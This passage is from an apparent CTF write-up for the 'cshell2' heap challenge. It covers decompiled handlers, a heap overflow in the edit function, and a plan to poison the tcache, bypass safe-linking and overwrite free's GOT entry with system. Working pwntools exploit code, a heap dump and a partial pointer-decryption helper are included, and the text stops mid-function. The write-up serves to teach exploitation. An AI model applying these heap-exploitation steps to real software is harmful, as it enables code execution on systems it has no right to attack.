  <span class="kt">int</span> <span class="n">idx_1</span><span class="p">;</span> <span class="c1">// ebx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Fh] [rbp-21h] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span><span class="c1"></span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter size (1032 minimum): &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0xEu</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x407</span> <span class="o">||</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Error with either index or size...&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">idx_1</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
    <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx_1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">chunk_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Successfuly added!&#34;</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input firstname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input middlename: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">midName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input lastname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">lastName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input age: &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">age</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input bio: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bio</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It creates a chunk by asking several fields but nothing actually interesting there. Let&rsquo;s take a look at the <code>show</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">show</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xEu</span> <span class="o">&amp;&amp;</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
    <span class="n">printf</span><span class="p">(</span>
      <span class="s">&#34;Name</span><span class="se">\n</span><span class="s"> last: %s first: %s middle: %s age: %d</span><span class="se">\n</span><span class="s">bio: %s&#34;</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">lastName</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">firstName</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">midName</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">age</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bio</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid index&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It prints a chunk only if it&rsquo;s allocated (size entry initialized in the size array) and if the index is right.
Then the <code>delete</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xEu</span> <span class="o">&amp;&amp;</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]);</span>
    <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Successfully Deleted!&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Either index error or trying to delete something you shouldn&#39;t be...&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Quite common <code>delete</code> handler, it prevents double free.
The vulnerability is in the <code>edit</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mh">0xEu</span> <span class="o">&amp;&amp;</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input firstname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input middlename: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">midName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input lastname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">lastName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input age: &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">age</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Input bio: (max %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">-</span> <span class="mi">32LL</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bio</span><span class="p">,</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">-</span> <span class="mi">32LL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Successfully edit&#39;d!&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It reads <code>size_array[2 * idx] - 32LL</code> bytes into a <code>0x100</code>-sized buffer which leads to a heap overflow.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>There is no actual issue, we can allocate whatever chunk bigger than <code>0x407</code>, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write with a tcache poisoning attack on the <code>0x410</code> tcache bin. Here is the attack I led against the challenge but that&rsquo;s not the most optimized.</p>
<p>The plan is to:</p>
<ul>
<li>Allocate two <code>0x408</code>-sized chunks : pivot and victim, in order to easily get later libc leak.</li>
<li>Allocate 9 more chunks and then fill the <code>0x410</code> tcachebin with them (with only 7 of them).</li>
<li>Delete <code>victim</code> and overflow pivot up to the next free pointer of <code>victim</code> to get a libc leak.</li>
<li>Allocate a <code>0x408</code>-sized chunk to get the <code>8</code>-th chunk (within <code>chunk_array</code>) which is on the top of the bin.</li>
<li>Leak the heap same way as for libc, but we have to defeat safe-linking.</li>
<li>Delete the <code>9</code>-th chunk to put it in the tcachebin at the first position.</li>
<li>Then we can simply <code>edit</code> chunk <code>8</code> and overflow over chunk <code>9</code> to poison its next <code>fp</code> to hiijack it toward the GOT entry of <code>free</code>.</li>
<li>Pop chunk <code>9</code> from the freelist and then request another the target memory area : the GOT entry of <code>free</code>.</li>
<li>Write <code>system</code> into the GOT entry of <code>free</code>.</li>
<li>Free whatever chunk for which <code>//bin/sh</code> is written at the right begin.</li>
<li>PROFIT.</li>
</ul>
<p>To understand the attack process I&rsquo;ll show the heap state at certain part of the attack.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="libc--heap-leak">
        Libc / heap leak
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#libc--heap-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Libc / heap leak" href="#libc--heap-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>First we have to fill the tcache. We allocate a chunk right after <code>chunk0</code> we do not put into the tcache to be able to put it in the unsortedbin to make appear unsortedbin&rsquo;s address:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;//bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="c1"># pivot</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="c1"># victim</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span><span class="p">):</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x1c7cc0</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="c1"># Heap state:</span>
<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x1de1290	0x0000000000000000	0x0000000000000411	................ [chunk0]
</span><span class="s2">0x1de12a0	0x68732f6e69622f0a	0x0000000000000a0a	./bin/sh........
</span><span class="s2">0x1de12b0	0x000000000000000a	0x0000000000000539	........9.......
</span><span class="s2">0x1de12c0	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x1de12d0	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x1de12e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de12f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1300	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1310	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1320	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1330	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1340	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1350	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1360	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1370	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1380	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1390	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1400	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1410	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1420	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1430	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1440	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1450	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1460	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1470	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1480	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1490	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1500	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1510	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1520	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1530	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1540	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1550	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1560	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1570	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1580	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1590	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1600	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1610	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1620	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1630	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1640	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1650	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1660	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1670	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1680	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1690	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de16a0	0x5959595959595959	0x0a59595959595959	YYYYYYYYYYYYYYY.	 &lt;-- unsortedbin[all][0] [chunk1]
</span><span class="s2">0x1de16b0	0x00007f34f64c3cc0	0x00007f34f64c3cc0	.&lt;L.4....&lt;L.4...
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>Then let&rsquo;s get a heap leak, we request back from the tcache the 8-th chunk, we free the <code>9</code>-th chunk that is allocated right after the <code>8</code>-th to be able to leak its next free pointer same way as for the libc previously. Plus we have to defeat safe-linking. To understand the defeat of safe-linking I advice you to read <a
  class="gblog-markdown__link"
  href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation"
  
  >this</a
>. It ends up to the <code>decrypt_pointer</code> function that makes use of known parts of the encrypted <code>fp</code> to decrypt the whole pointer. I didn&rsquo;t code the function by myself, too lazy for that, code comes from the <a
  class="gblog-markdown__link"
  href="https://github.com/AeroCTF/aero-ctf-2022/blob/main/tasks/pwn/heap-2022/solution/sploit.py#L44"
  
  >AeroCTF heap-2022 writeup</a
>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">decrypt_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">36</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
